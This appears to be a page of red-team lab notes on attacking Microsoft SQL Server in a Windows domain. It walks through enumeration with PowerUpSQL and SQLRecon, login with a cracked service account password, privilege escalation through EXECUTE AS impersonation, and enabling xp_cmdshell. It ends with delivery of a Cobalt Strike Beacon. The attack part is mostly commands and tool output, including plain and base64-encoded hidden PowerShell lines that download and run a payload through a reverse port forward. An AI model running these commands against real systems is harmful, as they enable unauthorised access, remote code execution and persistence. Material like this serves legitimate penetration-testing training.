---
description: 10/01/2025
---

# MS SQL Servers

## MS SQL Lateral Movement

Microsoft SQL Server is a relational database management system commonly found in Windows environments.

They are typically used to store information for a variety of reasons.

### Attack Surface

In addition to obvious data theft opportunities, they have an extremely large attack surface, allowing code execution, privilege escalation, lateral movement, and persistence.

### Interacting with MS SQL Servers

[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) and [SQLRecon](https://github.com/skahwah/SQLRecon) are excellent tools for enumerating and interacting with MS SQL Servers.

<mark style="color:yellow;">`PowerUpSQL`</mark> has a few cmdlets available for finding MS SQL Servers, including <mark style="color:yellow;">`Get-SQLInstanceDomain`</mark>, <mark style="color:yellow;">`Get-SQLInstanceBroadcast`</mark> and <mark style="color:yellow;">`Get-SQLInstanceScanUDP`</mark>:

```
beacon> powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
beacon> powershell Get-SQLInstanceDomain

ComputerName     : sql-2.dev.cyberbotic.io
Instance         : sql-2.dev.cyberbotic.io,1433
DomainAccountSid : 1500000521000672332383313895871914512914091400
DomainAccount    : mssql_svc
DomainAccountCn  : MS SQL Service
Service          : MSSQLSvc
Spn              : MSSQLSvc/sql-2.dev.cyberbotic.io:1433
LastLogon        : 8/15/2022 7:55 PM
Description      :
```

`Get-SQLInstanceDomain` works by searching for SPNs that begin with _MSSQL\*_.  This output shows that SQL-2 is running an instance of MS SQL server, under the context of the `mssql_svc` domain account.  You may also search the domain for groups that sound like they may have access to database instances (for example, a "SQL Admins" group).

<mark style="color:yellow;">**`Get-SQLConnectionTest`**</mark>**&#x20;can be used to test whether or not we can connect to the database:**

```
beacon> powershell Get-SQLConnectionTest -Instance "sql-2.dev.cyberbotic.io,1433" | fl

ComputerName : sql-2.dev.cyberbotic.io
Instance     : sql-2.dev.cyberbotic.io,1433
Status       : Accessible
```

**Then use&#x20;**<mark style="color:yellow;">**`Get-SQLServerInfo`**</mark>**&#x20;to gather more information about the instance:**

```
beacon> powershell Get-SQLServerInfo -Instance "sql-2.dev.cyberbotic.io,1433"

ComputerName           : sql-2.dev.cyberbotic.io
Instance               : SQL-2
DomainName             : DEV
ServiceProcessID       : 2668
ServiceName            : MSSQLSERVER
ServiceAccount         : DEV\mssql_svc
AuthenticationMode     : Windows Authentication
ForcedEncryption       : 0
Clustered              : No
SQLServerVersionNumber : 15.0.2000.5
SQLServerMajorVersion  : 2019
SQLServerEdition       : Standard Edition (64-bit)
SQLServerServicePack   : RTM
OSArchitecture         : X64
OsVersionNumber        : SQL
Currentlogin           : DEV\bfarmer
IsSysadmin             : No
ActiveSessions         : 1
```

{% hint style="info" %}
**If there are&#x20;**<mark style="color:green;">**multiple SQL Servers available**</mark>**, you can chain these commands together to automate the data collection:**

```
beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
{% endhint %}

SQLRecon can also enumerate servers via SPNs and fetch information about the instance with the `info` module.

```
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /enum:sqlspns

[*] Looking for MSSQL SPNs ...
[*] 1 found.

 |-> ComputerName:  sql-2.dev.cyberbotic.io
 |-> Instance:      sql-2.dev.cyberbotic.io:1433
 |-> AccountSid:    S-1-5-21-569305411-121244042-2357301523-1115
 |-> AccountName:   mssql_svc
 |-> AccountCn:     MS SQL Service
 |-> Service:       MSSQLSvc
 |-> SPN:           MSSQLSvc/sql-2.dev.cyberbotic.io:1433
 |-> LastLogon:     1/24/0423 12:48:15 PM
 
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io /module:info

[*] Extracting SQL Server information from sql-2.dev.cyberbotic.io

 |-> ComputerName:           SQL-2
 |-> DomainName:             DEV
 |-> ServicePid:             4388
 |-> ServiceName:            MSSQLSERVER
 |-> ServiceAccount:         DEV\mssql_svc
 |-> AuthenticationMode:     Windows Authentication
 |-> ForcedEncryption:       0
 |-> Clustered:              No
 |-> SqlServerVersionNumber: 15.0.2000.5
 |-> SqlServerMajorVersion:  2019
 |-> SqlServerEdition:       Standard Edition (64-bit)
 |-> SqlServerServicePack:   RTM
 |-> OsArchitecture:         X64
 |-> OsVersionNumber:        2022
 |-> CurrentLogin:           DEV\bfarmer
 |-> IsSysAdmin:             No
 |-> ActiveSessions:         1
```

\


The `/auth:wintoken` option allows SQLRecon to use the access token of the Beacon.  This output shows that whilst the database is accessible, our current user, bfarmer, is not a sysadmin.  SQLRecon has a nice module which can show us what roles we do have.

```
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:whoami

[*] Determining user permissions on sql-2.dev.cyberbotic.io,1433
[*] Logged in as DEV\bfarmer
[*] Mapped to the user guest
[*] Roles:
 |-> User is a member of public role.
 |-> User is NOT a member of db_owner role.
 |-> User is NOT a member of db_accessadmin role.
 |-> User is NOT a member of db_securityadmin role.
 |-> User is NOT a member of db_ddladmin role.
 |-> User is NOT a member of db_backupoperator role.
 |-> User is NOT a member of db_datareader role.
 |-> User is NOT a member of db_datawriter role.
 |-> User is NOT a member of db_denydatareader role.
 |-> User is NOT a member of db_denydatawriter role.
 |-> User is NOT a member of sysadmin role.
 |-> User is NOT a member of setupadmin role.
 |-> User is NOT a member of serveradmin role.
 |-> User is NOT a member of securityadmin role.
 |-> User is NOT a member of processadmin role.
 |-> User is NOT a member of diskadmin role.
 |-> User is NOT a member of dbcreator role.
 |-> User is NOT a member of bulkadmin role.
```

\


On default installations, standard users do not have this "public" role by default and must be explicitly granted through [SQL Server Manager Studio](https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms) (SSMS).  The aforementioned information on a SQL instance cannot be enumerated if the user's security context does not have a valid role.

\


![](https://files.cdn.thinkific.com/file_uploads/584845/images/3ff/4cb/2fa/roles.png)

\


Finding a user (or group) that does have access can be challenging, because without the ability to query the SQL instance to ask it, you can be stuck guessing.  One port of call is to look for appropriately named domain groups and their members.

```
beacon> powershell Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }

GroupName     MemberName
---------     ----------
MS SQL Admins jking
```

Another option is to go after the MS SQL service account itself as this is also often given sysadmin privileges.  This assumption is the basis of BloodHound's SQLAdmin attack path. &#x20;

We know that the domain account being used to run the service is `DEV\mssql_svc` and that the account is kerberoastable owing to its SPN. &#x20;

<mark style="color:$danger;">**If we can crack its plaintext password, we can use it to gain access to the SQL instance.**</mark> &#x20;

**The credentials can be used with `make_token` in Beacon and `/a:WinToken` in SQLRecon; or the `/a:WinDomain` option with `/d:<domain> /u:<username> /p:<password>` in SQLRecon directly.**

```
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:windomain /d:dev.cyberbotic.io /u:mssql_svc /p:Cyberb0tic /h:sql-2.dev.cyberbotic.io,1433 /m:whoami

[*] Determining user permissions on sql-2.dev.cyberbotic.io,1433
[*] Logged in as DEV\mssql_svc
[*] Mapped to the user dbo
[*] Roles:
 |-> User is a member of public role.
 |-> User is NOT a member of db_owner role.
 |-> User is NOT a member of db_accessadmin role.
 |-> User is NOT a member of db_securityadmin role.
 |-> User is NOT a member of db_ddladmin role.
 |-> User is NOT a member of db_backupoperator role.
 |-> User is NOT a member of db_datareader role.
 |-> User is NOT a member of db_datawriter role.
 |-> User is NOT a member of db_denydatareader role.
 |-> User is NOT a member of db_denydatawriter role.
 |-> User is a member of sysadmin role.
 |-> User is a member of setupadmin role.
 |-> User is a member of serveradmin role.
 |-> User is a member of securityadmin role.
 |-> User is a member of processadmin role.
 |-> User is a member of diskadmin role.
 |-> User is a member of dbcreator role.
 |-> User is a member of bulkadmin role.
```

\
**Once we have access, there are several options for issuing queries against a SQL instance.  `Get-SQLQuery` from PowerUpSQL:**

```
beacon> powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select @@servername"

Column1
-------
SQL-2
```

**SQLRecon:**

```
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:query /c:"select @@servername"

[*] Executing 'select @@servername' on sql-2.dev.cyberbotic.io,1433
column0 | 
----------
SQL-2 |
```

**`mssqlclient.py` from Impacket via proxychains:**

```
ubuntu@DESKTOP-3BSK7NO ~> proxychains mssqlclient.py -windows-auth DEV/bfarmer@10.10.122.25
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.25:1433-<><>-OK
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL-2): Line 1: Changed database context to 'master'.
[*] INFO(SQL-2): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands

SQL> select @@servername;

--------------------------------------------------------------------------------------------------------------------------------

SQL-2
```

**Or a Windows SQL GUI, such as** [**HeidiSQL**](https://www.heidisql.com/)**via Proxifier:**

![](https://files.cdn.thinkific.com/file_uploads/584845/images/574/967/edc/heidi.png)

## MS SQL Impersonation

_**MS SQL impersonation, or context switching, is a means which allows the executing user to assume the permissions of another user without needing to know their password.**_ &#x20;

One handy use case for the feature is to allow administrators to impersonate a user for testing purposes, e.g. a user is having a problem and they want to eliminate permissions as an issue.

**Impersonations must be explicitly granted through securable configurations:**

![](https://files.cdn.thinkific.com/file_uploads/584845/images/1ac/eb4/226/securables.png)

In this example, `DEV\Domain Users` have been granted the ability to impersonate the `DEV\mssql_svc` account.  This is clearly a security issue because it gives all Domain Users sysadmin privileges on this instance.

**We can discover accounts to impersonate manually using the following queries:**

```
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
```

![](https://files.cdn.thinkific.com/file_uploads/584845/images/faf/047/15b/impersonations.png)

**This shows that the `grantee_principal_id`, 268, is allowed to impersonate the `grantor_principal_id`, 267.  The IDs don't mean much, so we can look them up with:**

```
SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;
```

![](https://files.cdn.thinkific.com/file_uploads/584845/images/582/4f2/a54/principals.png)

Here, we see that `267` is `DEV\mssql_svc` and `268` is `DEV\Domain Users`.

**You can also write your own SQL query that will join these two, or use `SQLRecon`'s impersonate module:**

```
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:impersonate

[*] Enumerating accounts that can be impersonated on sql-2.dev.cyberbotic.io,1433
name | 
-------
DEV\mssql_svc |
```

**We can take advantage of this as `bfarmer`, who we know is not a sysadmin:**

```
SELECT SYSTEM_USER;
DEV\bfarmer

SELECT IS_SRVROLEMEMBER('sysadmin');
0
```

**Use `EXECUTE AS` to execute a query in the context of the target:**

```
EXECUTE AS login = 'DEV\mssql_svc'; SELECT SYSTEM_USER;
DEV\mssql_svc

EXECUTE AS login = 'DEV\mssql_svc'; SELECT IS_SRVROLEMEMBER('sysadmin');
1
```

**SQLRecon modules can also be run in "impersonation mode" by prefixing the module name with an `i` and specifying the principal to impersonate:**

```
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:iwhoami /i:DEV\mssql_svc

[*] Determining user permissions on sql-2.dev.cyberbotic.io,1433 as 'DEV\mssql_svc'
[*] Logged in as DEV\mssql_svc
[*] Mapped to the user dbo
[*] [+] Roles:
 |-> User is a member of public role.
 |-> User is NOT a member of db_owner role.
 |-> User is NOT a member of db_accessadmin role.
 |-> User is NOT a member of db_securityadmin role.
 |-> User is NOT a member of db_ddladmin role.
 |-> User is NOT a member of db_backupoperator role.
 |-> User is NOT a member of db_datareader role.
 |-> User is NOT a member of db_datawriter role.
 |-> User is NOT a member of db_denydatareader role.
 |-> User is NOT a member of db_denydatawriter role.
 |-> User is a member of sysadmin role.
 |-> User is a member of setupadmin role.
 |-> User is a member of serveradmin role.
 |-> User is a member of securityadmin role.
 |-> User is a member of processadmin role.
 |-> User is a member of diskadmin role.
 |-> User is a member of dbcreator role.
 |-> User is a member of bulkadmin role.
```

## MS SQL Command Execution

The _xp\_cmdshell_ procedure can be used to execute shell commands on the SQL server if you have sysadmin privileges. &#x20;

**`Invoke-SQLOSCmd` from PowerUpSQL provides a simple means of using it:**

```
beacon> powershell Invoke-SQLOSCmd -Instance "sql-2.dev.cyberbotic.io,1433" -Command "whoami" -RawResults

dev\mssql_svc
```

**The same will fail if you try manually in Heidi or mssqlclient, because xp\_cmdshell is disabled:**

```
SQL> EXEC xp_cmdshell 'whoami';
[-] ERROR(SQL-2): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server.
```

**To enumerate the current state of xp\_cmdshell, use:**

```
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';
```

![](https://files.cdn.thinkific.com/file_uploads/584845/images/406/8c2/83c/xpcmdshell-disabled.png)

**A value of&#x20;**_**0**_**&#x20;shows that xp\_cmdshell is disabled. To enable it:**

```
sp_configure 'Show Advanced Options', 1; RECONFIGURE;
sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

**Query sys.configurations again and the xp\_cmdshell value should be&#x20;**_**1**_**; and xp\_cmdshell will also now work:**

![](https://files.cdn.thinkific.com/file_uploads/584845/images/d9c/f07/b8a/xpcmdshell.png)

{% hint style="danger" %}
**OPSEC**\
\
**If you're going to make this type of configuration change to a target, you must ensure you set it back to its original value afterwards.**\
\
The reason this works with `Invoke-SQLOSCmd` is because it will automatically attempt to enable xp\_cmdshell if it's not already, execute the given command, and then disable it again.  This is a good example of why you should study your tools before you use them, so you know what is happening under the hood.
{% endhint %}

**SQLRecon also has a module for interacting with the xp\_cmdshell configuration, which can also be combined with the impersonation module:**

```
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ienablexp /i:DEV\mssql_svc

[*] Enabling xp_cmdshell as 'DEV\mssql_svc' on sql-2.dev.cyberbotic.io,1433
[+] SUCCESS: Enabled xp_cmdshell on sql-2.dev.cyberbotic.io,1433.
name | value | 
---------------
xp_cmdshell | 1 |

beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ixpcmd /i:DEV\mssql_svc /c:ipconfig

[*] Executing 'ipconfig' as 'DEV\mssql_svc' on sql-2.dev.cyberbotic.io,1433.
output | 
---------
 | 
Windows IP Configuration | 
 | 
 | 
Ethernet adapter Ethernet: | 
 | 
   Connection-specific DNS Suffix  . : ec2.internal | 
   IPv4 Address. . . . . . . . . . . : 10.10.122.25 | 
   Subnet Mask . . . . . . . . . . . : 255.255.254.0 | 
   Default Gateway . . . . . . . . . : 10.10.122.1 | 
 |
```

With command execution, we can work towards executing a Beacon payload. &#x20;

As with other servers in the lab, the SQL servers cannot talk directly to our team server in order to download a hosted payload. &#x20;

**Instead, we must setup a reverse port forward to tunnel that traffic through our C2 chain:**

```
beacon> run hostname
wkstn-2

beacon> getuid
[*] You are DEV\bfarmer (admin)

beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

beacon> rportfwd 8080 127.0.0.1 80
[+] started reverse port forward on 8080 to 127.0.0.1:80
```

**Next, host `smb_x64.ps1` at `/b` on the team server.  We know SMB will work because we can validate that port 445 is open on the target SQL server:**

```
beacon> portscan 10.10.122.25 445
(ICMP) Target '10.10.122.25' is alive. [read 8 bytes]
10.10.122.25:445 (platform: 500 version: 10.0 name: SQL-2 domain: DEV)
Scanner module is complete
```

**We can now download and execute the payload, for example:**

```
powershell -w hidden -c "iex (new-object net.webclient).downloadstring('http://wkstn-2:8080/b')"
```

OR

```
powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBiACcAKQA=
```

**Keep an eye on your web log so you know when the payload has been fetched:**

```
01/05 15:09:07 visit (port 80) from: 127.0.0.1
	Request: GET /b
	page Serves /home/attacker/cobaltstrike/uploads/smb_x64.ps1
	null
```

**You can then link to the Beacon:**

```
beacon> link sql-2.dev.cyberbotic.io TSVCPIPE-ae2b7dc0-4ebe-4975-b8a0-06e990a41337
[+] established link to child beacon: 10.10.122.25
```

![](https://files.cdn.thinkific.com/file_uploads/584845/images/028/123/c7d/mssqlsvc-beacon.png)

{% hint style="info" %}
**What payload would you use if port 445 was closed?**&#x20;

**Experiment with using the pivot listener here instead of SMB.**
{% endhint %}
